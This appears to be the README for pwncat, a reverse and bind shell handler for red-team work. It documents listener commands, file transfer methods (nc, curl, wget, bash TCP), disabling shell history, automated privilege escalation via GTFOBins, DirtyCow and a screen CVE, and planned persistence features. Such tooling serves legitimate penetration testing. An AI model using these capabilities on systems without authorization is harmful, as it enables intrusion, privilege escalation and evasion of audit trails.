# pwncat

pwncat is a raw bind and reverse shell handler. It streamlines common red team 
operations and all staging code is from your own attacker machine, not the target.

After receiving a connection, **pwncat** will setup some
common configurations when working with remote shells.

- Unset the `HISTFILE` environment variable to disable command history
- Normalize shell prompt
- Locate useful binaries (using `which`)
- Attempt to spawn a pseudoterminal (pty) for a full interactive session

`pwncat` knows how to spawn pty's with a few different methods and will
cross-reference the methods with the executables previously enumerated. After
spawning a pty, it will setup the controlling terminal in raw mode, so you can
interact in a similar fashion to `ssh`. 

`pwncat` will also synchronize the remote pty settings (such as rows, columns,
`TERM` environment variable) with your local settings to ensure the shell
behaves correctly.

To showcase a little bit of the cool functionality, I have recorded a short
[asciinema cast](https://asciinema.org/a/YFF84YCJfp9tQHhTuGkA2PJ4T).

pwncat documentation is being built out on [Read the Docs]. Head there for
the latest usage and development documentation!

## Install

### Dependencies

The python3 development files are required for building python dependencies. All of the dependencies are managed through `pip`. 

To install **pwncat** into its own python virtual environment:

``` bash
git clone https://github.com/calebstewart/pwncat/ # get pwncat

cd pwncat
$ sudo apt-get install python3-devel # install dependencies
$ python3 -m venv .venv
$ . .venv/bin/activate
$ pip install -r requirements.txt
$ python setup.py install

## Usage

```bash
# start a reverse shell listener on port 9999
python -m pwncat -r -p 9999
```

```bash
# access a bind shell on a given host and port
python -m pwncat -b -H 127.0.0.1 -p 9999
```

## Features and Functionality

**pwncat** allows you to local command interpreter at any time by getting to a blank
line and pressing the sequence `~C` (that's ``Shift+` `` then `Shift+c`). This new
prompt provides some basic interaction between your local host and the remote
host.

When at this prompt, you can return to your shell at any time with `C-d` or the
"back" command. To get a list of available commands, you can use `help`. At the
time of writing the following commands are supported:

```
(local) pwncat$ help                                                  
back            Exit command mode 
download        Download a file from the remote host 
help            View help for local commands 
privesc         Attempt privilege escalation 
reset           Reset the remote terminal (calls sync, reset, and sets PS1) 
set             Set or view the currently assigned variables 
sync            Synchronize the remote PTY with the local terminal settings 
upload          Upload a file to the remote host
```

### Transfering Files

Within the local prompt, you have the capability to `upload` and 
`download` files to and from the target. **pwncat** will attempt to
determine a `lhost` IP address to refer to your attacker machine, but if you
need to change this, you can modify the variable like so:

```bash
# change local host IP address if you need to
(local) pwncat$ set lhost "8.8.8.8"
```

The logic to transfer files is defined in `pwncat/uploaders` and 
`pwncat/downloaders` respectively. **pwncat** will smartly determine a usable
method to transfer files, but you can choose a specific one with the 
`--method` option.

```bash
usage: upload [-h] [--method {nc,curl,shell,bashtcp,wget}] [--output OUTPUT] path

positional arguments:
  path                  path to the file to upload

optional arguments:
  -h, --help            show this help message and exit
  --method, -m {nc,curl,shell,bashtcp,wget}
                        set the download method (default: auto)
  --output OUTPUT, -o OUTPUT
                        path to the output file (default: basename of input)
```

```bash
usage: download [-h] [--method {nc,curl,shell,bashtcp,raw}] [--output OUTPUT] path

positional arguments:
  path                  path to the file to download

optional arguments:
  -h, --help            show this help message and exit
  --method, -m  {nc,curl,shell,bashtcp,raw}
                        set the download method (default: auto)
  --output OUTPUT, -o OUTPUT
                        path to the output file (default: basename of input)
```

The methods that **pwncat** can transfer files with are as follows:

```
Both:
	nc 				netcat socket with random port -- requires port to be accessible
	curl 			HTTP request with port 80 -- requires curl on the target
	shell 			send echo and base64 -- no requirements, but can be slow
	bashtcp 		reuse the current socket -- no requirements
Upload specific:
	wget 			HTTP request with port 80 -- requires wget on the target

Download specific:
	raw 			read file contents and save to attacker -- no requirements
```

### Privilege Escalation

**pwncat** can attempt to perform privilege escalation with known techniques.
It will look for binaries on the target system that have known GTFOBins 
capabilities, and perform different methods to try and reach new users and
ultimately root.

```bash
usage: privesc [-h] [--list] [--all]
               [--user {root,caleb,john,sean,etc}]
               [--max-depth MAX_DEPTH] [--read READ] [--write WRITE] [--data DATA] [--text]

optional arguments:
  -h, --help            show this help message and exit
  --list, -l            do not perform escalation. list potential escalation methods
  --all, -a             when listing methods, list for all users. when escalating, escalate to
                        root.
  --user {root,caleb,john,sean,etc}
                        the target user
  --max-depth MAX_DEPTH, -m MAX_DEPTH
                        Maximum depth for the privesc search (default: no maximum)
  --read READ, -r READ  remote filename to try and read
  --write WRITE, -w WRITE
                        attempt to write to a remote file as the specified user
  --data DATA, -d DATA  the data to write a file. ignored if not write mode
  --text, -t            whether to use safe readers/writers
```

**pwncat** will try and run all known privilege escalation techniques.
The current methods that are supported by `privesc` are:

```
sudo 				Run available sudo commands with GTFOBins techniques
setuid 				Run available setuid binaries with GTFOBins techniques
screen 				Abuse screen-4.5.0 (CVE-2017-5618)
dirtycow 			Run DirtyCow exploit (CVE-2016-5195)
```

### BusyBox

If the target system does not have many useful "live-off-the-land" binaries,
**pwncat** can upload an appropriate copy of `busybox` in order to access more
commands. 

## Planned Features

**pwncat** would like to be come a red team swiss army knife. Hopefully soon,
more features will be added.

* More privilege escalation methods (sudo -u#-1 CVE, LXD containers, etc.)
* More transfer file methods (FTP, SMB, DNS, ICMP, etc. )
* Persistence methods (bind shell, cronjobs, SSH access, PAM abuse, etc.)
* Aggression methods (spam randomness to terminals, flush firewall, etc.)
* Meme methods (terminal-parrot, cowsay, wall, etc.)
* Network methods (port forward, internet access through host, etc.)

[Read the Docs]: https://pwncat.readthedocs.io/en/latest